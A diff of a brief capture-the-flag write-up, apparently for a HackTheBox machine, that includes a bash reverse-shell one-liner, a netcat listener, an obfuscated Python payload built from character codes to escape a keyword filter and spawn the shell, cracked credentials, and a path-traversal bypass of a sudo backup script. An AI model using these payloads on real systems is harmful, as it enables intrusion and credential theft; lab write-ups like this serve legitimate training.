@@ -1,66 +1,52 @@
-Started: 5/8/25
-Completed: 5/8/25
+Started: 5/8/25  
+Completed: 5/8/25  
 
+![nmap](./images/nmap.png)  
 
-![nmap](nmap.png)
+popen was blocked  
+![keywordblock](./images/keywordblocked.png)  
 
+RevShells basic format: bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'  
 
+nc -lvnp 4444  
 
-popen was blocked
-![keywordblock](keywordblocked.png)
+x = ().__class__.__bases__[0].__subclasses__()
+e = [c for c in x if c.__name__ == ''.join([chr(i) for i in [80,111,112,101,110]])][0]
+cmd = ''.join([chr(i) for i in [
+    98,97,115,104,32,45,99,32,98,97,115,104,32,45,105,32,62,38,32,
+    47,100,101,118,47,116,99,112,47,49,48,46,49,48,46,49,52,46,49,48,
+    47,52,52,52,52,32,48,62,38,49
+]])  # bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'
+e(['/bin/bash', '-c', cmd], shell=False) 
 
+RevShell/Foothold  
+![revshell](./images/revshell.png)  
 
+![userflag](./images/userflag.png)  
 
-RevShells basic format: bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'
+database.db  
+![database](./images/database.png)  
 
-nc -lvnp 4444
+crackstation  
+![crackstation](./images/crackstation.png)  
 
-`x = ().__class__.__bases__[0].__subclasses__()`
-`e = [c for c in x if c.__name__ == ''.join([chr(i) for i in [80,111,112,101,110]])][0]`
-`cmd = ''.join([chr(i) for i in [`
-    `98,97,115,104,32,45,99,32,98,97,115,104,32,45,105,32,62,38,32,`
-    `47,100,101,118,47,116,99,112,47,49,48,46,49,48,46,49,52,46,49,48,`
-    `47,52,52,52,52,32,48,62,38,49`
-`]])  # bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'`
-`e(['/bin/bash', '-c', cmd], shell=False)`
+development:development  
+martin:nafeelswordsmaster  
 
-RevShell/Foothold
-![revshell](HackTheBox/Code/revshell.png)
+sudo -l  
+![sudo](./images/sudo.png)  
 
+backy.sh  
+![backy](./images/backy.png)  
 
+Getting Root  
 
-![userflag](userflag.png)
+![task](./images/task.png)  
 
+bypasses the filter since it removes ../ but will leave ../ for path traversal. Since it's running as sudo it will successfully grab the files  
 
+![exploit](./images/exploit.png)  
 
-database.db
-![database](database.png)
-
-crackstation
-![crackstation](crackstation.png)
-
-development:development
-martin:nafeelswordsmaster
-
-
-
-
-sudo -l
-![sudo](sudo.png)
-
-backy.sh
-![backy](backy.png)
-
-
-Getting Root
-
-![task](task.png)
-
-bypasses the filter since it removes ../ but will leave ../ for path traversal. Since it's running as sudo it will successfully grab the files
-
-![exploit](exploit.png)
-
-![loot](loot.png)
+![loot](./images/loot.png)  
 
 We grabbed the flag but we can also grab the ssh private key of root and log into the system as root if we wanted.
-
